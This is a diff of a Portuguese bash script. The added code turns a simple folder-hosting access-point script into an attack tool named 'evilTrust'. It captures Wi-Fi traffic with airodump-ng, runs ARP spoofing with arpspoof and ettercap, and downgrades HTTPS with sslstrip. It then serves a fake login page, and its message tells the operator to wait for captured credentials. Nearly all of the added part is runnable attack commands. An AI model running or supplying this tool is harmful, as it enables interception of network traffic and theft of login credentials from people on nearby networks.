@@ -2,75 +2,67 @@
 # Script por Jeanpseven (wrench)
 # GitHub: jeanpseven
 
-# Função para escolher um IP disponível na sub-rede 192.168.1.x
-choose_available_ip() {
-    local base_ip="192.168.1"
-    local suffix=2
+#!/bin/bash
 
-    while true; do
-        local ip_to_check="$base_ip.$suffix"
-        if ! ping -c 1 -W 1 $ip_to_check &>/dev/null; then
-            echo "$ip_to_check"
-            break
-        fi
-        ((suffix++))
-    done
-}
+iface=""
 
-# Listar diretórios disponíveis
-echo "Diretórios disponíveis:"
-directories=($(find . -maxdepth 1 -type d -printf "%f\n"))
+echo -e "[*] Pressione Ctrl+C para encerrar.\n"
 
-# Exibir lista numerada
-for ((i=0; i<${#directories[@]}; i++)); do
-    echo "$((i+1)). ${directories[i]}"
+# Mostrar lista de interfaces numeradas
+echo "[*] Lista de Interfaces Disponíveis:"
+interfaces=($(airmon-ng | grep "wlan" | awk '{print $2}'))
+for i in "${!interfaces[@]}"; do
+  echo "[$((i+1))] ${interfaces[$i]}"
 done
 
-# Solicitar escolha do usuário
-while true; do
-    read -p "Escolha o número do diretório a ser hospedado: " choice
-    if [[ "$choice" =~ ^[0-9]+$ && "$choice" -ge 1 && "$choice" -le ${#directories[@]} ]]; then
-        selected_dir=${directories[choice-1]}
-        break
-    else
-        echo "Escolha inválida. Tente novamente."
-    fi
+# Capturar a escolha do usuário
+read -p "[*] Escolha a interface Wi-Fi (informe o número): " choice
+iface=${interfaces[$((choice-1))]}
+
+# Listar pastas no diretório do script
+echo -e "\n[*] Pastas Disponíveis no Diretório Atual:"
+folders=($(ls -d */))
+for i in "${!folders[@]}"; do
+  echo "[$((i+1))] ${folders[$i]}"
 done
 
-# Solicitar informações do usuário
-read -p "Digite o nome da interface Wi-Fi: " interface
-read -p "Digite o nome da rede (SSID): " ssid
-read -p "Digite a senha da rede (ou deixe em branco para uma rede aberta): " password
+# Capturar a escolha do usuário para a pasta
+read -p "[*] Escolha a pasta para colocar o site falso (informe o número): " folder_choice
+selected_folder=${folders[$((folder_choice-1))]}
 
-# Escolher automaticamente um IP disponível
-ip_address=$(choose_available_ip)
+# Caminho completo para a pasta selecionada
+site_folder=$(realpath "$selected_folder")
 
-# Configurar hostapd
-cat <<EOL | sudo tee /etc/hostapd/hostapd.conf > /dev/null
-interface=$interface
-ssid=$ssid
-hw_mode=g
-channel=7
-wmm_enabled=0
-macaddr_acl=0
-auth_algs=1
-ignore_broadcast_ssid=0
-EOL
+# Mostrar lista de templates numerados
+echo -e "\n[*] Lista de Templates Disponíveis:"
+templates=("template1" "template2" "template3")  # Adicione aqui os nomes dos templates
+for i in "${!templates[@]}"; do
+  echo "[$((i+1))] ${templates[$i]}"
+done
 
-if [ -n "$password" ]; then
-    cat <<EOL | sudo tee -a /etc/hostapd/hostapd.conf > /dev/null
-wpa=2
-wpa_passphrase=$password
-wpa_key_mgmt=WPA-PSK
-wpa_pairwise=TKIP
-rsn_pairwise=CCMP
-EOL
-fi
+# Capturar a escolha do usuário para o template
+read -p "[*] Escolha o template para a tela falsa (informe o número): " template_choice
+selected_template=${templates[$((template_choice-1))]}
 
-# Mudar para o diretório selecionado
-cd "$selected_dir"
+airodump-ng $iface -w "$site_folder/capture" > /dev/null 2>&1 &
 
-# Iniciar um servidor HTTP simples para hospedar o diretório
-python3 -m http.server 80
+sleep 3
 
-echo "Configuração concluída! Seu diretório '$selected_dir' está sendo hospedado em http://$ip_address"
+xterm -geometry 75x15+1+20 -T "evilTrust - Criando Portal de Login Falso" -e "bash -c 'arpspoof -i $iface -t 10.0.0.1 10.0.0.10'" &
+
+sleep 2
+
+xterm -geometry 75x15+1+40 -T "evilTrust - Redirecionando Tráfego HTTP" -e "bash -c 'sslstrip -f -k -w $site_folder/sslstrip.log'" &
+
+sleep 2
+
+xterm -geometry 75x15+1+60 -T "evilTrust - Iniciando MITM" -e "bash -c 'ettercap -T -q -i $iface -M arp:remote /10.0.0.1// /10.0.0.10-250//'" &
+
+sleep 2
+
+echo -e "\n[*] O evilTrust está ativo. Aguarde até que as credenciais sejam capturadas.\n"
+
+# Usar o template escolhido
+cp -r "$selected_template/"* "$site_folder/"
+
+wait
